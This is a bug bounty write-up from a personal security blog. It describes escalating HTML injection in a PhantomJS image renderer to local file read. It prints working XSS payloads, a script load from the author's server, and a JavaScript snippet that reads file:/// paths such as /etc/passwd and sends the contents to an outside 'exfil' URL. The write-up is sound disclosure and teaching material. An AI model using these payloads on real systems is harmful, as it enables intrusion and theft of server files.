---
source: zlz-buerhaus
source_url: https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/
title: "Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read | ziot"
---

[< Back](https://buer.haus/)

![](https://buer.haus/wp-content/uploads/2017/06/phantomjs.png)

I recently came across across a request on a bounty program that took user input and generated an image for you to download. After a little bit of a journey, I was able to escalate from XSS inside of an image all the way to arbitrary local-file read on the server. It's a private program, so I'm going to do my best to redact as much information as possible.

The original request looked something like this:

```
https://website/download?background=file.jpg&author=Brett&header=Test&text=&width=500&height=500
```

And it would output a file like this:

![](https://buer.haus/wp-content/uploads/2017/06/file.png)

I initially went after the background request var because it specified a file name and I think that one looks the most interesting. After messing around with the parameters a bit, I noticed that the header request variable was vulnerable to some form of HTML injection. I have read some write-ups of XSS inside of PDFs leading to critical vulnerabilities, so I decided to chase this a bit.

```
https://website/download?background=file.jpg&author=Brett&header="><u>test&text=&width=500&height=500
```

Output:

![](https://buer.haus/wp-content/uploads/2017/06/xss.png)

Starting to put random HTML elements in, I noticed that almost all of them were rendering: iframe, img, script, etc. I decided to target my own server to see if I could get a bit more information on what is processing the HTML.

```
https://website/download?background=file.jpg&author=Brett&header=<iframe src=https://xss.buer.haus/ssrftest></iframe>&text=&width=500&height=500
```

![](https://buer.haus/wp-content/uploads/2017/06/iframe.png)

Response:

```
[25/Jun/2017:20:31:49 -0400] "GET /ssrftest HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1"
```

The User-Agent in the request means they are using the headless browser client [PhantomJS](http://phantomjs.org/) to load an HTML page and generate image data. I already had some experience with Phantom because it's often used in CTFs and I use it in my online scanner for capturing screenshots of websites. This was a good thing to pick-up on early because it explained some of the issues I encountered while trying to exploit this vulnerability.

The first problem I ran into was that JavaScript was not consistently executing using basic payloads. <script></script> would not execute properly. <img src=x onerror=> would not trigger consistently. I think I got one successful window.location redirect out of 100 attempts. In some cases, the payloads would not execute at all. On top of that, I was running into some server exceptions when trying to redirect to another page:

```
https://website/download?background=file.jpg&author=Brett&header=<img src="x" onerror="window.location='https://xss.buer.haus/'" />&text=&width=500&height=500
```

Response:

```
{"message": "Internal server error"}.
```

I tried probably 50 different types of payloads there until I realized that the problem is actually with what appeared to be some sort of race condition with PhantomJS. I ran into a similar issue writing a plugin for Phantom with my scanner where it would not wait for JavaScript to completely load when trying to capture some screenshots.

I needed to find a way to make Phantom wait for my JavaScript to load before trying to finish rendering the screenshot. After trying a few different ideas, I used document.write to completely overwrite the page contents and that seemed to fix it. I don't know why, but it worked.

```
https://website/download?background=file.jpg&author=Brett&header=<img src="x" onerror="document.write('test')" />&text=&width=500&height=500
```

Response:

![](https://buer.haus/wp-content/uploads/2017/06/test-1.png)

At this point I had consistent JavaScript execution on every page load. The next step I needed to take was to gather more information about PhantomJS and the context of what and where we are executing.

```
https://website/download?background=file.jpg&author=Brett&header=<img src="x" onerror="document.write(window.location)" />&text=&width=500&height=500
```

Response:

![](https://buer.haus/wp-content/uploads/2017/06/var-location-1.png)

Interesting enough, we are executing from the origin of file:// and it was an HTML file in /var/task/. Now I wanted to see if I could <iframe> the file just to validate that I'm in the same origin as /var/task/.

```
https://website/download?background=file.jpg&author=Brett&header=<img src="xasdasdasd" onerror="document.write('<iframe src=file:///var/task/[redacted].html></iframe>')"/>&text=&width=500&height=500
```

![](https://buer.haus/wp-content/uploads/2017/06/local-file-1.png)

Now I know I can at least load files in /var/task/, so the next thing I want to do is see if I can load other files such as in /etc/.

```
&header=<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
```

No response. 🙁

I [searched for more information on /var/tasks](https://www.google.com/search?q=%22%2Fvar%2Ftask%22&ie=utf-8&oe=utf-8) and found out that it was related to AWS Lambda. This pointed me to a few files in the same folder that should contain source code for the Phantom plugin such as /var/task/index.js. I decided the contents of the files I have access to in /var/ may give me more information or at least contain something worth reporting.

Using XHR and making Ajax requests I should be able to load the contents of the files and display them in the image or exfil it out to my server. I ran into additional issues putting this JavaScript directly in document.write and eventually found out that I could load an external script and it would circumvent these issues.

Payload:

```
&header=<img src="xasdasdasd" onerror="document.write('<script src="https://xss.buer.haus/test.js"></script>')"/>
```

test.js

```

function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    document.write('<iframe src="https://xss.buer.haus/exfil?data='+b64+'"></iframe>');
}
var oReq = new XMLHttpRequest();
oReq.addEventListener("load", reqListener);
oReq.open("GET", "file:///var/task/[redacted].html");
oReq.send();
```

It's hard to show the results of this without exposing sensitive data, so here's just an idea of what you might see in your access logs.

![](https://buer.haus/wp-content/uploads/2017/06/response.png)

Now I was getting arbitrary file read using out-of-band JavaScript and XHR within the context of file://. I pointed the script to /etc/passwd again just to see if this might work where iframes did not.

![](https://buer.haus/wp-content/uploads/2017/06/passwds.png)

Boom! XHR had complete access to the file:// context when PhantomJS loading a file in <iframe src="file://"> for some reason did not.

In hindsight, the XSS payload seems really trivial but it took a lot of effort and guessing to get there. This is one of those weird bounties where you feel like you are trying to get a flag in a CTF challenge instead of trying to exploit a production server. My biggest takeaway from this was all of those weekends spent trying to beat obscure CTF challenges may have actually been useful after all.